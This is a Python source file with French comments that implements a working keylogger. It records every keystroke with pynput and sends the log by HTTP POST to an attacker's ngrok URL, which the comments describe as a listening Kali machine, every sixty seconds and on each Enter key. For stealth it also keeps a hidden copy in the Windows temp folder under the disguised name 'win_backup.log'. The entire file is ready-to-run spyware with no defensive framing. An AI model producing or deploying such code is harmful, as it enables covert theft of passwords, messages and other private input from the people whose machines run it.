import pynput.keyboard
import requests
import time
import threading 
import os
import tempfile 
import sys 

# --- Configuration Distante (VOTRE ADRESSE NGROK) ---
# Ceci est l'URL de votre Kali Attaquante qui écoute sur le port 5000 via Ngrok.
NGROK_URL = "http://jeanelle-quintic-lumberingly.ngrok-free.dev" 
INTERVAL_SECONDS = 60 # Envoi toutes les 60 secondes

# --- Gestion du Chemin de Sauvegarde Windows (Furtivité) ---
# Utilise le dossier temporaire de Windows pour cacher le fichier de sauvegarde locale.
LOG_FILE = os.path.join(tempfile.gettempdir(), "win_backup.log") 

# Variables globales
log_buffer = ""

def send_log_data(data):
    """
    Envoie les données au serveur ngrok.
    Vide le buffer UNIQUEMENT si l'envoi réussit (code 200).
    Fait toujours une sauvegarde locale.
    """
    global log_buffer
    
    # Ne fait rien si le buffer est vide
    if not data.strip():
        return 

    # --- Sauvegarde locale de sécurité (Écriture) ---
    # Cette étape est faite en premier au cas où la connexion échoue
    try:
        with open(LOG_FILE, "a") as f:
            f.write(data)
    except Exception:
        pass # Ignore les erreurs d'écriture de fichier

    # --- Tentative d'envoi à Kali ---
    try:
        response = requests.post(NGROK_URL, data={'log': data})
        
        if response.status_code == 200:
            # SUCCÈS : Vide le buffer, le log n'est plus renvoyé par le minuteur.
            log_buffer = "" 
        # Échec HTTP (code != 200) : ne vide PAS le buffer.
             
    except requests.exceptions.RequestException:
        # Échec de la connexion (réseau coupé) : ne vide PAS le buffer.
        pass

def report():
    """
    Fonction d'envoi exécutée en parallèle toutes les INTERVAL_SECONDS.
    Elle est lancée dans un thread séparé.
    """
    global log_buffer
    
    # Configure le minuteur pour exécuter report() à nouveau dans 60 secondes
    threading.Timer(INTERVAL_SECONDS, report).start() 
    
    # Si le buffer contient des données, on les envoie
    if log_buffer:
        send_log_data(log_buffer)

def on_press(key):
    """
    Capture les frappes de clavier, filtre les touches de contrôle et remplit le buffer.
    """
    global log_buffer
    
    current_key = None
    
    try:
        # Tente d'obtenir le caractère (A, b, 1, $, etc.)
        current_key = key.char
        
    except AttributeError:
        # Gère les touches spéciales
        if key == pynput.keyboard.Key.space:
            current_key = " "
        elif key == pynput.keyboard.Key.enter:
            current_key = "\n"
        elif key == pynput.keyboard.Key.backspace:
            # Gère le backspace immédiatement dans le buffer
            if len(log_buffer) > 0:
                log_buffer = log_buffer[:-1]
            return # Sort immédiatement
        else:
            # IGNORER : Toutes les autres touches de contrôle (CTRL, ALT, SHIFT, F1, etc.)
            return 
            
    # --- LOGIQUE D'ENREGISTREMENT ---
    if current_key:
        log_buffer += current_key
    
    # Déclenche l'envoi immédiat si c'est la touche ENTRÉE
    if current_key == "\n":
        send_log_data(log_buffer)
            
def on_release(key):
    """Permet d'arrêter le keylogger avec ESC pour les tests."""
    if key == pynput.keyboard.Key.esc:
        return False

# --- Démarrage ---

# Démarre le minuteur pour l'envoi périodique dans un thread séparé
report() 

# Crée et lance l'écouteur dans le thread principal
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    # Le keylogger commence à écouter
    listener.join()
